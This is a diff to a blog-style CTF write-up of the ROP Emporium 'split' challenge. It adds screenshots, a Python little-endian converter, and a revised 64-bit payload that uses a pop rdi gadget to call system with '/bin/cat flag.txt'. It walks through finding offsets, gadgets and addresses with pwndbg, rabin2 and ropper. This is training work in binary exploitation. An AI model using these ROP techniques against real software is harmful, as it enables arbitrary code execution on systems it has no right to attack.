@@ -8,6 +8,12 @@ I'll let you in on a secret: that useful string `"/bin/cat flag.txt"` is still p
 Before we begin let's check the **permissions on our target binary.** We're employing ROP due to the presence of `NX`, but we'd feel pretty stupid if it turned out that none of these binaries were compiled with NX enabled. **We'll check that this isn't the case and we can't just `jmp esp` with a little shellcode.**
 `rabin2 -I` split lets us know that NX is indeed enabled: (Equivalent to performing a checksec)
 
+![file](/post-images/split/01file.png)
+
+We first run the program to check the programs behaviour.
+
+![run](/post-images/split/02run.png)
+
 Now that you've gathered the elements of your exploit you can start to piece them together, you want to call **system()** with the `"/bin/cat flag.txt"` string as the only argument. You'll also have to start dealing with the differences between the various architectures' calling conventions. 
 **You can do the x86 challenge with just a 2 link chain and the x86_64 challenge with a 3 link chain.** 
 
@@ -18,14 +24,83 @@ We can use `rabin2 -z` to check for strings and their addresses.
 We can also use `rabin2 -1` to check for the program functions, and we can spot the **system** function.
 we have a `usefulfunction()` which contains the `system` call.
 
-Run `gdb-pwndbg`, check and disassemble functions of **main** and **usefulFunctions()**. We can get the address of **/bin/cat/flag.txt**, using search. Its important to search for the whole string `/bin/cat/flag.txt` as the string since searching for the address of `flag.txt` only brings the offset of that part of the string only while we need the whole string.
-Since we have both addresses, the `systemcall()` and the string `/bin/cat/flag.txt`, we can now create a ROP chain. We can generate the cyclic pattern using `cyclic 100 ` and input so that the system crashes. We get an offset of **44 bytes**, which we write `44 bytes` to the buffer before we can overwrite the system.
+![strings](/post-images/split/03strings.png)
+
+![binaddress](/post-images/split/04binaddress%20(copy%201).png)
+
+Run `gdb-pwndbg`, check and disassemble functions of **main** and **usefulFunctions()**. We can get the address of **/bin/cat/flag.txt**, using search. 
+
+![usefulFunction](/post-images/split/05usefulFunctions%20(copy%201).png)
+
+Its important to search for the whole string `/bin/cat/flag.txt` as the string since searching for the address of `flag.txt` only brings the offset of that part of the string only while we need the whole string.
+Since we have both addresses, the `systemcall()` and the string `/bin/cat/flag.txt`, we can now create a ROP chain. We can generate the cyclic pattern using `cyclic 100 ` and input so that the system crashes. 
+
+![crash](/post-images/split/06crash%20(copy%201).png)
+
+We get an offset of **44 bytes**, which we write `44 bytes` to the buffer before we can overwrite the system.
+
+![offset](/post-images/split/08offset%20(copy%201).png)
 
 So lets start manually;
-We print out the payload  with 40 A's + the system address and the bin/cat/flag.txt. and remember to put them in **little endian format.** with this we can run the split and pass in the payload as input/ run with the payload then we get the flag.
+We print out the payload  with 40 A's + the system address and the bin/cat/flag.txt. and remember to put them in **little endian format**. I wrote a code for converting the addresses to little endian because it is a task to do it manually. 
+
+Here is the code :
+```python
+def hex_to_little_endian():
+    # Ask user for architecture
+    while True:
+        arch = input("Is the address from a 32-bit or 64-bit program? (32/64): ").strip()
+        if arch in ['32', '64']:
+            byte_size = 4 if arch == '32' else 8
+            break
+        print("Invalid input. Please enter '32' or '64'.")
+
+    # Ask user for hex address
+    while True:
+        hex_str = input("Enter the hexadecimal address (with or without 0x): ").strip()
+        
+        # Remove 0x prefix if present and validate hex digits
+        hex_clean = hex_str.lower().replace('0x', '')
+        
+        if not all(c in '0123456789abcdef' for c in hex_clean):
+            print("Invalid hexadecimal format. Try again.")
+            continue
+            
+        # Check if address fits in the specified architecture
+        if len(hex_clean) > byte_size * 2:  # Each byte is 2 hex digits
+            print(f"Address too large for {arch}-bit architecture (max {byte_size} bytes). Try again.")
+            continue
+            
+        break
+
+    # Pad with leading zeros to match architecture size
+    hex_padded = hex_clean.zfill(byte_size * 2)
+    
+    # Convert to little-endian
+    bytes_le = bytes.fromhex(hex_padded)[::-1]
+    
+    # Generate escaped format
+    escaped = ''.join(f'\\x{byte:02x}' for byte in bytes_le)
+    
+    # Output results
+    print("\nResults:")
+    print(f"Little Endian: {escaped}")
+    print(f"Raw bytes: {bytes_le!r}")
+
+if __name__ == "__main__":
+    hex_to_little_endian()
+```
+
+![endian](/post-images/split/11little%20endian%20(copy%201).png)
+
+
+![endian](/post-images/split/09littlendian%20(copy%201).png)
+
+With this we can run the split and pass in the payload as input/ run with the payload then we get the flag.
 To get a more visualized form we can set a breakpoint at `system` using `b system` then we can `run < payload`. With that we can see the system being called at the `EIP <--call address`.
 We can see the `bin/cat/flag.txt` is on the stack then hit continue `c` till we get to the flag.
 
+![](/post-images/split/10flag%20(copy%201).png)
 
 So for automatically run it we can use `pwntools`
 here is the payload;
@@ -111,6 +186,9 @@ success(flag)
 ```
 
 we run it and get the flag.
+
+![pwndbg](/post-images/split/12pwndbg.png)
+
 There is an autopwn script for this challenge, without using all this code.
 
 we will have to look for the offset manually.
@@ -161,8 +239,9 @@ success(flag)
 
 Step 2 64 bit program
 ---
-
-We perform the usuall running of the program and see that it crashes with a segmentation fault. It crashes With us not seeing whats in the `instruction pointer RIP`. We can use the last 4 bytes at the end of the `RBP (Base pointer)` WE get 40 bytes.
+Just like the 32 bit but with 64 bit specific
+ things.
+ We perform the usuall running of the program and see that it crashes with a segmentation fault. It crashes With us not seeing whats in the `instruction pointer RIP`. We can use the last 4 bytes at the end of the `RBP (Base pointer)` WE get 40 bytes.
 Just like the 32 bit we check the system call and the /bin/cat/flag.txt addresses and use them.
 
 > Unlike the **32_bit** structure where the **bin/cat/flag.txt_is_called_form_the_stack** because we were able to place the system call over the Instruction pointer then followed it with the command that we wanted on the stack which was the /bin/cat/flag.txt. In the **64_bit** structure we are not able to place it in the `RIP`, it is required to be in the `RDI` so we will need to get the /bin/cat/flag.txt onto that register. We will use the `pop rdi` gadget to do this.
@@ -170,11 +249,21 @@ Just like the 32 bit we check the system call and the /bin/cat/flag.txt addresse
 We can look for an instruction that is in the **RDI** to pop a value from the stack to the register(**RDI**). We can use a tool called Ropper.
 We can input `ropper -f` to get a list of all the gadgets and their addresses.
 so we can search for the `pop rdi` gadget using ;
+
 > ropper -f ./split64 --search "pop rdi"
+
+![ropper](/post-images/split/16poprdi.png)
 
 With the  rop gadget we can create a chain of instructions that will pop the /bin/cat/flag.txt. So we will have to input it in first then the system call then the bin/cat
 
-> python2 -c "print "A" * offset + **rop_gadget** + **system_call** + **/bin/cat/flag.txt** >> payload
+> python2 -c 'print "A" * offset + **rop_gadget** + **/bin/cat/flag.txt** + **systemcall()**' > payload
+
+![ROPchain](/post-images/split/14payload1.png)
+
+This is because it will have to place the `bin/cat/flag.txt` on the RDI (`rop_gadget`) address first then the system call will coninue and call the object in the RDI.
+It is advisable to take the addresses from your GDB rather than the `rabin2` mostly for the system call because the addresses are not the same
+
+![15flag](/post-images/split/15flag.png)
 
 Prints the flag with a segmentation fault.
 ---
